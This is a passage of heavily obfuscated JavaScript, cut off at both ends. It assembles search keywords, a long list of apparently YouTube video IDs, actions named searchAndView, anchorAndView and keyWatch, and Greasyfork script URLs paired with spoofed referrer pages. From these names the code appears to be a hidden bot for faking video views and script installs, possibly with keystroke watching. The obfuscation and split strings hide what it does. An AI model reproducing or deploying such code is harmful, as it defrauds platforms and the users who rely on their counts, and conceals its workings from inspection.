'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x8 * 0x28d + 0x248f + -0x101d)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x23bc + 0x1372 + -0x16 * -0xbe)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x3ec * 0x5 + -0x25b3 + 0x3952);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    Z(0x1b, 'YEV%') + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    Z(0xa, 'I*d*') + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    a0(0x11) + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    a0(0xd) + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    Z(0x5, '1MF2') + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    a1(0x1c) + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    a0(0x17) + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    Z(0x18, '7m#p') + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0xc) + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + a1(0x1f) + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + a0(0xc) + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
